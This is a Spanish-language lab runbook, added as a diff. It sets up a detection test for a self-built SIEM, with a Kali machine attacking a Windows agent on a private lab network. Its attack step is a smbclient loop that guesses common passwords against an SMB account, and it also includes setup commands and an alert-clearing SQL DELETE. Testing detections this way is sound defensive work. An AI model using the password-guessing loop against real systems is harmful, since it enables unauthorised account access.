@@ -1,0 +1,91 @@
+================================================================
+  WIN-001 - Fuerza bruta SMB  (Kali -> Windows)
+================================================================
+
+VENTANAS:
+  U   Ubuntu (.101)   backend + vigilar worker
+  W1  Windows (.102)  agente Windows (PowerShell ADMIN)
+  K   Kali (.103)     el ataque
+
+
+----------------------------------------------------------------
+  1. UBUNTU (U) - comprobar que el backend esta vivo
+----------------------------------------------------------------
+cd ~/siem-forense
+docker compose ps                              # postgres y redis: healthy
+curl -s http://localhost:3000/api/v1/health    # responde JSON
+ps aux | grep main.worker | grep -v grep       # el worker debe aparecer
+
+# Si falta el worker, arrancalo:
+nohup pnpm --filter api start:worker > ~/worker.log 2>&1 &
+
+# Dejar esta ventana vigilando el worker:
+tail -f ~/worker.log
+
+
+----------------------------------------------------------------
+  2. WINDOWS (W1) - arrancar el agente (PowerShell ADMIN)
+----------------------------------------------------------------
+# Preparacion (solo si no se hizo en esta sesion):
+auditpol /set /subcategory:"{0CCE9215-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable
+New-NetFirewallRule -DisplayName "SIEM lab SMB" -Direction Inbound -Protocol TCP -LocalPort 445 -RemoteAddress 192.168.56.0/24 -Action Allow
+
+# Arrancar el agente:
+$env:SIEM_AGENT_KEY='siem_...(windows)'
+echo $env:SIEM_AGENT_KEY                        # debe verse la llave real, no el ejemplo
+cd C:\siem\agente
+.\agente_windows.ps1                            # "Agente siguiendo Security (4624,4625,4720)..."
+
+# Dejar corriendo en esta ventana.
+
+
+----------------------------------------------------------------
+  3. (OPCIONAL) UBUNTU - borrar alertas WIN-001 previas
+----------------------------------------------------------------
+# Para que la alerta nazca de cero (si no, el antiduplicados la salta -> "nuevas":0)
+docker compose exec -T postgres psql -U siem -d siem -c "DELETE FROM alertas WHERE regla_id='WIN-001';"
+
+
+----------------------------------------------------------------
+  4. KALI (K) - el ataque
+----------------------------------------------------------------
+for p in 123456 password admin qwerty letmein hola1234 test1234 root toor 12345678 111111 iloveyou; do
+  smbclient -L //192.168.56.102 -U "Usuario10%$p" -t 3
+done
+
+# Veras NT_STATUS_LOGON_FAILURE en cada intento (normal).
+# Puede acabar en NT_STATUS_ACCOUNT_LOCKED_OUT: tambien es normal.
+
+
+----------------------------------------------------------------
+  5. QUE DEBE APARECER
+----------------------------------------------------------------
+  W1 (agente)  -> 202 login_failed Usuario10 192.168.56.103
+  U  (worker)  -> deteccion.evaluada ... "nuevas":1
+  Web          -> Alertas -> BUSCAR -> WIN-001 (clave 192.168.56.103)
+
+  Web: http://192.168.56.101:5173   (usuario admin)
+
+
+----------------------------------------------------------------
+  SI ALGO FALLA
+----------------------------------------------------------------
+Agente da 401
+   -> Llave mal copiada (1 vs l vs I). PEGA la llave, no la teclees.
+
+Agente no saca 202 al atacar
+   -> Falta la auditoria de Logon (paso 2: auditpol 0CCE9215...).
+
+Kali no conecta / timeout
+   -> Falta abrir el firewall (paso 2: New-NetFirewallRule).
+      Comprobar desde Kali:  nc -zv 192.168.56.102 445
+
+"nuevas":0 en el worker
+   -> La alerta ya existia (antiduplicados). Borrala (paso 3) y reataca.
+
+Web no cambia
+   -> Clic en BUSCAR (cache de 30 s).
+
+smbclient: command not found (en Kali)
+   -> sudo apt install smbclient
+================================================================
